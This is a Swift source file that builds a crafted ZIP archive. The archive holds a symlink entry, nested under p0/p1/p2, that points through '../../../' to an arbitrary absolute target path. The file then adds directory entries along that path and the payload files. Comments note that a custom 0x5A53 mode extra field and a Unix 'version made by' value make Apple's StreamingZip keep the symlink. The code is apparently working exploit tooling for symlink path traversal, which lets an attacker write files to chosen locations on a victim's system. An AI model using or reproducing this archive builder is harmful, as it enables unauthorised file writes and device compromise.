import Foundation

struct ZipArchive {
    private struct Entry {
        let name: String
        let mode: UInt32
        let data: Data
    }

    private let symlinkMode: UInt32 = 0o120000 | 0o777
    private let directoryMode: UInt32 = 0o040000 | 0o755
    private let fileMode: UInt32 = 0o100000 | 0o600
    private let metadataExtraID: UInt16 = 0x5A53

    func build(target: String, files: [(String, Data)]) throws -> Data {
        let normalizedTarget = try normalizedTarget(target)
        let targetTail = String(normalizedTarget.dropFirst())
        var entries: [Entry] = [
            Entry(name: "META-INF/", mode: directoryMode, data: Data()),
            Entry(
                name: "META-INF/com.apple.ZipMetadata.plist",
                mode: fileMode,
                data: try PropertyListSerialization.data(
                    fromPropertyList: ["Version": 2],
                    format: .binary,
                    options: 0
                )
            ),
            Entry(name: "p0/", mode: directoryMode, data: Data()),
            Entry(name: "p0/p1/", mode: directoryMode, data: Data()),
            Entry(name: "p0/p1/p2/", mode: directoryMode, data: Data()),
            Entry(
                name: "p0/p1/p2/link",
                mode: symlinkMode,
                data: Data("../../../\(targetTail)".utf8)
            )
        ]

        var cursor = ""
        for component in targetTail.split(separator: "/") {
            cursor += "\(component)/"
            entries.append(Entry(name: cursor, mode: directoryMode, data: Data()))
        }

        for (index, file) in files.enumerated() {
            entries.append(Entry(name: "payload_\(index)", mode: fileMode, data: file.1))
        }
        if let first = files.first {
            entries.append(Entry(name: "payload", mode: fileMode, data: first.1))
        }

        return encode(entries)
    }

    private func normalizedTarget(_ target: String) throws -> String {
        guard target.hasPrefix("/"), target != "/", !target.contains("\0") else {
            throw AirCardError.invalidTarget(target)
        }
        let components = target.dropFirst().split(separator: "/", omittingEmptySubsequences: false)
        guard !components.isEmpty,
              components.allSatisfy({ !$0.isEmpty && $0 != "." && $0 != ".." }) else {
            throw AirCardError.invalidTarget(target)
        }
        return target
    }

    private func encode(_ entries: [Entry]) -> Data {
        var output = Data()
        var centralDirectory = Data()

        for entry in entries {
            let name = Data(entry.name.utf8)
            let extra = extraField(mode: entry.mode)
            let crc = crc32(entry.data)
            let offset = UInt32(output.count)

            output.appendLE(UInt32(0x04034b50))
            output.appendLE(UInt16(20))
            output.appendLE(UInt16(0))
            output.appendLE(UInt16(0))
            output.appendLE(UInt16(0x2800))
            output.appendLE(UInt16(0x5D30))
            output.appendLE(crc)
            output.appendLE(UInt32(entry.data.count))
            output.appendLE(UInt32(entry.data.count))
            output.appendLE(UInt16(name.count))
            output.appendLE(UInt16(extra.count))
            output.append(name)
            output.append(extra)
            output.append(entry.data)

            centralDirectory.appendLE(UInt32(0x02014b50))
            // Version made by: Unix (3) + ZIP 2.0. The reference archive
            // relies on this together with the 0x5A53 mode extra field so
            // StreamingZip preserves the symlink entry.
            centralDirectory.appendLE(UInt16((3 << 8) | 20))
            centralDirectory.appendLE(UInt16(20))
            centralDirectory.appendLE(UInt16(0))
            centralDirectory.appendLE(UInt16(0))
            centralDirectory.appendLE(UInt16(0x2800))
            centralDirectory.appendLE(UInt16(0x5D30))
            centralDirectory.appendLE(crc)
            centralDirectory.appendLE(UInt32(entry.data.count))
            centralDirectory.appendLE(UInt32(entry.data.count))
            centralDirectory.appendLE(UInt16(name.count))
            centralDirectory.appendLE(UInt16(extra.count))
            centralDirectory.appendLE(UInt16(0))
            centralDirectory.appendLE(UInt16(0))
            centralDirectory.appendLE(UInt16(0))
            centralDirectory.appendLE(entry.mode << 16)
            centralDirectory.appendLE(offset)
            centralDirectory.append(name)
            centralDirectory.append(extra)
        }

        let centralOffset = UInt32(output.count)
        output.append(centralDirectory)
        output.appendLE(UInt32(0x06054b50))
        output.appendLE(UInt16(0))
        output.appendLE(UInt16(0))
        output.appendLE(UInt16(entries.count))
        output.appendLE(UInt16(entries.count))
        output.appendLE(UInt32(centralDirectory.count))
        output.appendLE(centralOffset)
        output.appendLE(UInt16(0))
        return output
    }

    private func extraField(mode: UInt32) -> Data {
        var data = Data()
        data.appendLE(metadataExtraID)
        data.appendLE(UInt16(2))
        data.appendLE(UInt16(mode & 0xFFFF))
        return data
    }

    private func crc32(_ data: Data) -> UInt32 {
        var crc: UInt32 = 0xFFFF_FFFF
        for byte in data {
            crc ^= UInt32(byte)
            for _ in 0..<8 {
                crc = (crc & 1) == 1 ? (crc >> 1) ^ 0xEDB8_8320 : crc >> 1
            }
        }
        return ~crc
    }
}

private extension Data {
    mutating func appendLE<T: FixedWidthInteger>(_ value: T) {
        var littleEndian = value.littleEndian
        Swift.withUnsafeBytes(of: &littleEndian) { append(contentsOf: $0) }
    }
}
